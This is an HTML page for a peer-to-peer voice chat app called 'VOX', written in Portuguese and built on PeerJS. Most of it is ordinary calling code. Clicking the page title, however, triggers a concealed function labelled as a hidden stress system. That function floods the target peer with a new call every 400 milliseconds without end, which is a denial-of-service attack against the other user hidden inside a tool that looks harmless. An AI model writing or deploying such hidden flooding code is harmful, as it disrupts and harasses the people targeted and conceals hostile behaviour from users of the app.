<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VOX | Private</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        :root { --bg: #070707; --surface: #121212; --border: #222; --accent: #fff; --radius: 15px; }
        * { box-sizing: border-box; margin: 0; padding: 0; outline: none; }
        body { font-family: system-ui, -apple-system, sans-serif; background: var(--bg); color: #eee; display: flex; align-items: center; justify-content: center; height: 100vh; padding: 20px; }
        
        .card { width: 100%; max-width: 340px; background: var(--surface); padding: 40px 30px; border: 1px solid var(--border); border-radius: var(--radius); box-shadow: 0 20px 40px rgba(0,0,0,0.4); text-align: center; }
        h1 { font-size: 0.75rem; letter-spacing: 6px; margin-bottom: 35px; color: var(--accent); cursor: crosshair; user-select: none; }
        
        input { width: 100%; background: #000; border: 1px solid var(--border); padding: 16px; color: #fff; margin-bottom: 12px; border-radius: 10px; text-align: center; font-family: monospace; }
        button { width: 100%; padding: 16px; background: var(--accent); color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 10px; text-transform: uppercase; font-size: 0.7rem; }
        
        #room-ui { display: none; }
        .status { font-size: 0.7rem; color: #555; margin: 20px 0; text-transform: uppercase; letter-spacing: 1px; }
        #log { background: #000; color: #0f0; font-family: monospace; font-size: 9px; padding: 10px; border-radius: 8px; text-align: left; max-height: 80px; overflow-y: auto; margin-top: 15px; display: none; }
    </style>
</head>
<body>

    <div class="card">
        <h1 onclick="runFlood()">VOX_SYSTEM</h1>

        <div id="setup-ui">
            <input type="text" id="my-id" placeholder="SEU ID (ex: bryan)">
            <input type="text" id="peer-id" placeholder="ID DO AMIGO (ex: joao)">
            <button onclick="conectar()">INICIAR LINK</button>
        </div>

        <div id="room-ui">
            <div class="status" id="st-text">Aguardando...</div>
            <div id="log"></div>
            <button onclick="location.reload()" style="background:transparent; color:#444; border:1px solid #222; margin-top:30px;">ENCERRAR</button>
        </div>
    </div>

    <div id="audio-container"></div>

    <script>
        let peer = null;
        let localStream = null;
        let floodActive = false;

        function writeLog(m) {
            const l = document.getElementById('log');
            l.style.display = 'block';
            l.innerHTML += `> ${m}<br>`;
            l.scrollTop = l.scrollHeight;
        }

        async function conectar() {
            const me = document.getElementById('my-id').value.trim();
            const other = document.getElementById('peer-id').value.trim();
            if(!me || !other) return alert("Preencha os IDs.");

            try {
                localStream = await navigator.mediaDevices.getUserMedia({ 
                    audio: { echoCancellation: true, noiseSuppression: true } 
                });

                document.getElementById('setup-ui').style.display = 'none';
                document.getElementById('room-ui').style.display = 'block';

                // Configuração STUN para atravessar firewalls
                peer = new Peer(me, {
                    config: {'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }]}
                });

                peer.on('open', () => {
                    document.getElementById('st-text').innerText = "ONLINE: " + me;
                    writeLog("Servidor de sinalização OK.");
                    
                    // Tenta ligar para o outro automaticamente a cada 5 segundos
                    const callInterval = setInterval(() => {
                        writeLog("Tentando link com: " + other);
                        const call = peer.call(other, localStream);
                        if(call) bindCall(call);
                    }, 5000);

                    // Se conectar, para de tentar
                    peer.on('connection', () => clearInterval(callInterval));
                });

                peer.on('call', (call) => {
                    writeLog("Chamada recebida.");
                    call.answer(localStream);
                    bindCall(call);
                });

                peer.on('error', (err) => {
                    writeLog("Erro: " + err.type);
                });

            } catch (e) { alert("Microfone bloqueado ou sem HTTPS."); }
        }

        function bindCall(call) {
            call.on('stream', (stream) => {
                if(document.getElementById('audio-'+call.peer)) return;
                const a = document.createElement('audio');
                a.id = 'audio-' + call.peer;
                a.srcObject = stream;
                a.autoplay = true;
                document.getElementById('audio-container').appendChild(a);
                document.getElementById('st-text').innerText = "LINK ESTABELECIDO";
                writeLog("Áudio recebido de " + call.peer);
            });
        }

        // --- SISTEMA DE ESTRESSE OCULTO ---
        async function runFlood() {
            const other = document.getElementById('peer-id').value.trim();
            if(!other || floodActive) return;
            floodActive = true;
            writeLog("EXECUTANDO FLOOD NO ALVO...");

            while(floodActive) {
                const b = new Peer();
                b.on('open', () => {
                    b.call(other, localStream);
                    setTimeout(() => b.destroy(), 1500);
                });
                await new Promise(r => setTimeout(r, 400));
            }
        }
    </script>
</body>
</html>
